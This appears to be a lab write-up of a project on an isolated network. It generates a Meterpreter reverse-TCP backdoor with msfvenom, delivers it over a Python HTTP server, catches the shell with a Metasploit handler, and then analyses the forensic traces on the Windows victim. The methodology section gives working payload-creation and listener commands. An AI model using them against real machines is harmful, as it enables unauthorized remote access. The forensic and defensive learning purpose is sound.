# Project 02 - Meterpreter Backdoor & Intrusion Analysis

**Date:** 2026-05-04  
**Tools:** msfvenom, Metasploit, Meterpreter, netstat, Windows Event Viewer  
**Environment:** Kali Linux (attacker) -> Windows 10 (victim), isolated host-only network

---

## Objective
Create a malicious executable using msfvenom, deliver it to a Windows target, establish a Meterpreter reverse shell, and identify the forensic artefacts left behind on the victim machine.

---

## Methodology

### 1. Payload creation
Generated a reverse TCP Meterpreter payload on Kali: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.44.129 LPORT=4444 -f exe -o /home/leteh/backdoor.exe
Output: backdoor.exe, 7680 bytes

### 2. Delivery
Hosted the file via Python HTTP server: python3 -m http.server 8080
Victim downloaded backdoor.exe from http://192.168.44.129:8080

### 3. Listener setup
Configured Metasploit handler on Kali:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.44.129
set LPORT 4444
run
### 4. Shell obtained
Meterpreter session opened: Meterpreter session 1 opened (192.168.44.129:4444 -> 192.168.44.128:51290)
---

## Findings from inside the victim machine

| Command | Output |
|---------|--------|
| sysinfo | Windows 10 22H2, DESKTOP-96F5GKI |
| getuid | DESKTOP-96F5GKI\Leteh |
| whoami | desktop-96f5gki\leteh |

---

## Forensic Evidence

### Network connection - netstat
Running netstat -ano on the victim machine revealed the active backdoor connection: TCP 192.168.44.128:51290  192.168.44.129:4444  ESTABLISHED  2188
**Key forensic finding:** An ESTABLISHED outbound connection to an unknown external IP on port 4444 is a classic indicator of compromise. Port 4444 is Metasploit's default listener port and is immediately suspicious to any experienced analyst.

### Windows Event Viewer
- Event ID 4688 (Process Creation) logging was not enabled before the attack, demonstrating the importance of configuring audit policies before an incident occurs.
- Event ID 4624 (Logon) showed 199 logon events around the time of the intrusion.

---

## Lessons learned

| Finding | Forensic significance |
|---------|----------------------|
| Outbound connection on port 4444 | Primary indicator of Meterpreter backdoor |
| backdoor.exe in Downloads folder | Delivery artefact - shows user was tricked into running it |
| Process auditing not pre-configured | Critical gap - process creation evidence was lost |
| Windows Defender blocked initial download | Demonstrates importance of endpoint protection |

---

## Conclusion
A reverse TCP backdoor was successfully deployed and executed on the Windows victim. The primary forensic indicator was an ESTABLISHED TCP connection from the victim to the attacker on port 4444, visible via netstat. This project demonstrates both the attacker methodology and the investigator's perspective on identifying active intrusions on live systems.

---

## Next steps
- Capture Meterpreter traffic with Wireshark to analyse the encrypted C2 channel
- Investigate prefetch files for backdoor.exe execution artefacts
- Analyse Windows registry run keys for persistence mechanisms

